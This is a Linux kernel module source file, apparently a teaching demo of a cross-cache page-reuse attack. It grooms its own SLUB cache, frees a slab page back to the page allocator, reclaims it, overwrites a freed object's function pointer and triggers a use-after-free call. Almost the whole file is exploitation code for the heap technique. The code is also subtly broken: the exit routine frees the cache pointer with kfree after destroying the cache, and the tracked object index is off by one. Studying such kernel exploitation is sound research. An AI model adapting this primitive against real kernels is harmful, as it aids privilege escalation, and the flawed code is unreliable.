#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/slub_def.h>

#define OBJECT_SIZE 0x200
#define OBJS 1024
#define OO_SHIFT 16 // 定义位移
#define OO_MASK ((1 << OO_SHIFT) - 1)

struct demo_struct
{
    union 
    {
        char data[OBJECT_SIZE];
        struct 
        {
            void (*func)(void);
            char padding [OBJECT_SIZE-8];
        };
        
    };
    
}__attribute__((aligned(OBJECT_SIZE)));


static struct kmem_cache *my_cache_ptr;
struct demo_struct **ds_list;
struct demo_struct *ds_tmp;

void hello_func(void){
    printk("() => hello func");
}
void hack_func(void){
    printk("() => hack func : cross page attack success");
}

static int demo_init(void){

    unsigned int cpu_partial,objs_per_slab;
    static unsigned int ds_sp=0;
    int i,uaf_obj_index,page_order;
    unsigned long page_size;
    struct demo_struct* uaf_object,*random_ms;
    void* target_page_virt,*realloc_page_virt;
    struct page* realloc_page;
    
    printk("\ndemo attack start\n");
    ds_list = kmalloc(sizeof(struct demo_struct *)*OBJS,GFP_KERNEL|__GFP_ZERO);
    
    /*
        kmem_cache_create 用于 linux 内核中创建内存缓存
        name = 缓存名称 ， size = 每个对象的大小
        align 对齐要求，默认0对齐 ，
        flags 缓存标志 SLAB_HWCACHE_ALIGN 对象在高速缓存中对齐
            SLAB_PANIC 分配失败时panic
            SLAB_ACCOUNT 内存计数
        constructor 构造函数 
    */
    my_cache_ptr = kmem_cache_create(
        "demo_struc",sizeof(struct demo_struct),0,
        SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT,NULL); 

    cpu_partial=my_cache_ptr->cpu_partial;
    objs_per_slab=my_cache_ptr->oo.x & OO_MASK;
    page_size=objs_per_slab*(my_cache_ptr->object_size);
    page_order = get_order(page_size);

    printk("cache info:");
    printk(">>cache name -> %s\n",my_cache_ptr->name);
    printk(">>objs_per_slab -> %u\n",objs_per_slab);
    printk(">>object_size -> 0x%x\n",my_cache_ptr->object_size);
    printk(">>cpu_partial -> %u\n",cpu_partial);
    printk(">>page_size:0x%lx -> page_order:%d\n",page_size,page_order);


    random_ms =kmem_cache_alloc(my_cache_ptr,GFP_KERNEL);
    printk("Alloc a random object at %px\n",random_ms);
    kmem_cache_free(my_cache_ptr,random_ms);

    
    printk("\n===================STEP 1===================");
    printk("Alloc : (cpu_partial+1) * objs_per_slab objects");
    printk("Alloc : %u * %u == %u\n",cpu_partial+1,objs_per_slab,(cpu_partial+1)*objs_per_slab);
    /* kmem_cache_alloc 分配从指定内存缓存中分配内存 */
    for (i = 0; i < (cpu_partial+1)*objs_per_slab; i++)
    {
        ds_list[ds_sp++]=kmem_cache_alloc(my_cache_ptr,GFP_KERNEL);
    }
 
    
    printk("\n===================STEP 2===================");
    printk("Alloc : objs_per_slab+1(%u) objects\n",objs_per_slab+1);

    for ( i = 0; i < objs_per_slab+1; i++)
    {
        ds_list[ds_sp++]=kmem_cache_alloc(my_cache_ptr,GFP_KERNEL);
    }
    printk("\n===================STEP 3===================");
    printk("Alloc : uaf object");
    
    uaf_object=kmem_cache_alloc(my_cache_ptr,GFP_KERNEL);
    uaf_obj_index=ds_sp++;
    ds_list[ds_sp]=uaf_object;
    target_page_virt=(void*)((unsigned long)uaf_object & ~(unsigned long)(page_size - 1));
    printk(">> uaf object index: %d", uaf_obj_index);
    printk(">> uaf object at %px, page: %px", uaf_object, target_page_virt);
    printk(">> set function pointer to hello() and call it\n");
    uaf_object->func=hello_func;
    uaf_object->func();

    printk("\n===================STEP 4===================");
    printk("Alloc : objs_per_slab+1(%u) objects\n",objs_per_slab+1);
    for ( i = 0; i < objs_per_slab+1; i++)
    {
        ds_list[ds_sp++]=kmem_cache_alloc(my_cache_ptr,GFP_KERNEL);
    }

    printk("\n===================STEP 5===================");
    printk("Free : uaf object");
    kmem_cache_free(my_cache_ptr,uaf_object);

    printk("\n===================STEP 6===================");
    printk("Free : make uaf object is empty");
    for ( i = 1; i < objs_per_slab ; i++)
    {
        kmem_cache_free(my_cache_ptr,ds_list[uaf_obj_index+i]);
        kmem_cache_free(my_cache_ptr,ds_list[uaf_obj_index-i]);
        ds_list[uaf_obj_index+i]=NULL;
        ds_list[uaf_obj_index-i]=NULL;
    }

    printk("\n===================STEP 7===================");
    printk("Free : free one object per page\n");
    for (i = 0; i <  (cpu_partial+1)*objs_per_slab ; i+=objs_per_slab)
    {
        if(ds_list[i]){
            kmem_cache_free(my_cache_ptr,ds_list[i]);
            ds_list[i]=NULL;   
        }
    }
    printk("let's check if we can get the target page ...");
    /*  alloc_pages 用于分配物理页面 
        order:指定要分配的页面数量,
        实际分配的内存大小为 PAGE_SIZE << order（即 PAGE_SIZE * 2^order）
    */
    realloc_page=alloc_pages(GFP_KERNEL,page_order);
    realloc_page_virt = page_address(realloc_page);
    printk("realloc page at %px\n", realloc_page_virt);
    printk("target page at  %px\n", target_page_virt);
    if(realloc_page_virt==target_page_virt){
        printk("realloc SUCCESS :)");
    }else{
        printk("cross page attack failed :(");
        return -1;
    }
    printk("assume we has the ability to overwrite the content of page");
    for (i = 0; i < page_size / 8; i++) {
        ((void **)realloc_page_virt)[i] = (void *)hack_func;
    }
    printk("now, let's call func again (UAF)");
    uaf_object->func();

    free_page((unsigned long)realloc_page);
    ds_list[uaf_obj_index]=NULL;
    return 0;
}

static void demo_exit(void){
    int i;
    for ( i = 0; i < OBJS; i++)
    {
        if(ds_list[i]){
            kmem_cache_free(my_cache_ptr,ds_list[i]);
        }
    }
    kmem_cache_destroy(my_cache_ptr);
    kfree(my_cache_ptr);
    printk("bye");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("X++D && veritas && mowen");
MODULE_DESCRIPTION("Cross page demo");
MODULE_VERSION("0.1");